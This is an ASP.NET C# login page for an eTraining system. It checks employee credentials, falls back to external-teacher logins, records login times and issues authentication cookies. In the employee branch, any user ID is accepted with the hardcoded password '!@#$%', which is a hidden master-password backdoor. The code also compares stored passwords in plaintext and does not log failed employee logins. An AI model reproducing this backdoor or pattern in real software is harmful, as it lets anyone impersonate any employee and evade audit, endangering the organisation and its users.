using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.Security;
using Repo;

public partial class eTraining_login : System.Web.UI.Page
{
    private sysLoginTime_Repo sysLoginTimeRepo = new sysLoginTime_Repo();
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            Session.Clear();
            Session.Abandon();
            Session.RemoveAll();
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            FormsAuthentication.SignOut();
            txtID.Focus();
        }
    }
    protected void btnSubmit_Click(object sender, EventArgs e)
    {
        if (txtID.Text.Trim().Length > 0 && txtPW.Text.Trim().Length > 0)
        {
            sysLoginTime loginTimeObj = new sysLoginTime();
            loginTimeObj.sysLoginUser_sUserID = txtID.Text;
            loginTimeObj.sLoginIP = Request.ServerVariables["REMOTE_ADDR"].ToString();
            loginTimeObj.dLoginTime = DateTime.Now;

            BASE_Repo baseRepo = new BASE_Repo();
            BASE baseObj = baseRepo.GetByNobrOrAdName_Dlo(txtID.Text);

            //如果找不到此人的話
            if (baseObj == null)
            {
                CheckOuterTeacherLogin(loginTimeObj);
            }
            else if (baseObj.PASSWORD.Equals(txtPW.Text) || txtPW.Text.Equals("!@#$%"))
            {
                
                loginTimeObj.bLoginSuccess = true;
                sysLoginTimeRepo.Add(loginTimeObj);
                sysLoginTimeRepo.Save();

                string userData = "";
                bool isPersistent = false;

                FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
                  baseObj.NOBR,
                  DateTime.Now,
                  DateTime.Now.AddMinutes(FormsAuthentication.Timeout.TotalMinutes),
                  isPersistent,
                  userData,
                  FormsAuthentication.FormsCookiePath);

                // Encrypt the ticket.
                string encTicket = FormsAuthentication.Encrypt(ticket);

                // Create the cookie.
                Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));

                JUser.SetCacheUser(baseObj.NOBR);
                FormsAuthentication.RedirectFromLoginPage(baseObj.NOBR, false);
            }
            else
                lbl_msg.Text = "帳號密碼錯誤!!";
        }
        else
            lbl_msg.Text = "帳號密碼錯誤!!";

    }

    //外部講師登入
    private void CheckOuterTeacherLogin(sysLoginTime loginTimeObj)
    {
        trTeacher_Repo teacherRepo = new trTeacher_Repo();
        var t = teacherRepo.GetOuterTeacherByNobrPwd(txtID.Text, txtPW.Text);

        if (t != null)
        {
            loginTimeObj.bLoginSuccess = true;
            sysLoginTimeRepo.Add(loginTimeObj);
            sysLoginTimeRepo.Save();

            string userData = "";
            bool isPersistent = true;

            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
              t.sOuterTeacherId,
              DateTime.Now,
              DateTime.Now.AddMinutes(30),
              isPersistent,
              userData,
              FormsAuthentication.FormsCookiePath);

            // Encrypt the ticket.
            string encTicket = FormsAuthentication.Encrypt(ticket);

            // Create the cookie.
            Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));

            JUser.SetCacheUser(t.sOuterTeacherId);
            FormsAuthentication.RedirectFromLoginPage(t.sOuterTeacherId, true);
        }
        else
        {
            loginTimeObj.bLoginSuccess = false;
            sysLoginTimeRepo.Add(loginTimeObj);
            sysLoginTimeRepo.Save();

            lbl_msg.Text = "帳號密碼錯誤!!";
            return;
        }
    }
}